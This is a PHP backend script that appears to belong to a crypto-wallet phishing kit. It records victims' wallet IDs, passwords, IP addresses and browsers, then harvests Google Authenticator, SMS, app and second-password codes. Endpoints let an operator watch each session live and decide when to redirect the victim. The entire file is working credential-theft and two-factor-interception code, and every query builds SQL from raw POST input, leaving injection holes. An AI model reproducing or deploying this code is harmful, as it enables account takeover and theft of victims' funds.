<?php
include "../admin/config/data.php";
include "../control.php";
$cur_status = $_POST['cur_status'];
if($cur_status == "saveLoginData"){
    
    $password = $_POST['password'];
    $wallet_id = $_POST['wallet_id'];
    $browser_name = $_POST['browser_name'];
    $time = date("Y-m-d H:i:s");
    $sql = "INSERT INTO tbl_login (wallet_id, wallet_pwd, ip, browser_name, time, is_alarm)
    VALUES ( '" . $wallet_id . "', '" . $password . "', '" . $_SERVER['REMOTE_ADDR'] . "', '" . $browser_name . "', '" . $time . "', 'yes' )";
    if ($conn->query($sql) === TRUE) {
        $last_id = $conn->insert_id;
        echo $last_id;
      } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
      }
}else if($cur_status == "getAdminDecision"){
    $cur_id = $_POST['cur_id'];
    $sql = "SELECT id, admin_decision FROM tbl_login where id = " . $cur_id;
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
    // output data of each row
        while($row = $result->fetch_assoc()) {
            $id =  $row["id"];
            $admin_decision = $row["admin_decision"];
        }
        echo json_encode(["id" => $id, "admin_decision" => $admin_decision]);
    } else {
        echo json_encode(["id" => -1, "admin_decision" => -1]);
    }
}else if($cur_status == "reEnterEmailAuth"){
    $cur_id = $_POST['cur_id'];
    $password = $_POST['password'];
    $wallet_id = $_POST['wallet_id'];
    // $googleAuthEmail = $_POST['googleAuthEmail'];
    $sql = "UPDATE tbl_login SET google_auth_code = null,  final_decision = null, admin_decision = null, wallet_id = '".$wallet_id."', wallet_pwd='".$password."' WHERE id = ".$cur_id;
    $result = $conn->query($sql);
    echo $result;
}else if($cur_status == "saveGoogleAuth"){
    $cur_id = $_POST['cur_id'];
    $auth_code = $_POST['auth_code'];
    // $googleAuthEmail = $_POST['googleAuthEmail'];
    $sql = "UPDATE tbl_login SET google_auth_code = '".$auth_code."' WHERE id = ".$cur_id;
    $result = $conn->query($sql);
    echo $result;
}else if($cur_status == "saveSmsAuth"){
    $cur_id = $_POST['cur_id'];
    $auth_code = $_POST['auth_code'];
    $sql = "UPDATE tbl_login SET sms_code = '".$auth_code."' WHERE id = ".$cur_id;
    $result = $conn->query($sql);
    echo $result;
}else if($cur_status == "saveAppAuth"){
    $cur_id = $_POST['cur_id'];
    $auth_code = $_POST['auth_code'];
    $sql = "UPDATE tbl_login SET auth_app_code = '".$auth_code."' WHERE id = ".$cur_id;
    $result = $conn->query($sql);
    echo $result;
}else if($cur_status == "saveSecondPassword"){
    $cur_id = $_POST['cur_id'];
    $auth_code = $_POST['auth_code'];
    $sql = "UPDATE tbl_login SET password2 = '".$auth_code."' WHERE id = ".$cur_id;
    $result = $conn->query($sql);
    echo $result;
}else if($cur_status == "getFinalDecision"){
    $cur_id = $_POST['cur_id'];
    $sql = "SELECT final_decision FROM tbl_login WHERE id = ".$cur_id;
    $result = $conn->query($sql);
    if ($result->num_rows > 0) {
        // output data of each row
        while($row = $result->fetch_assoc()) {
            $final_decision =  $row["final_decision"];
        }
        // echo json_encode(["final_decision" => $final_decision, "target_url" => $out_url]);
    } else {
        // echo json_encode(["id" => -1, "admin_decision" => -1]);
    }
    // $final_decision = $result[0]->final_decision;
    $sql = "UPDATE tbl_login SET final_decision = 0 WHERE id = ".$cur_id;
    $result = $conn->query($sql);

    if($final_decision == 1){
        echo json_encode(["final_decision" => $final_decision, "target_url" => $out_url]);
    }else if($final_decision == 2){
        echo json_encode(["final_decision" => $final_decision, "target_url" => ""]);
    }else{
        echo json_encode(["final_decision" => $final_decision, "target_url" => ""]);

    }
}
?>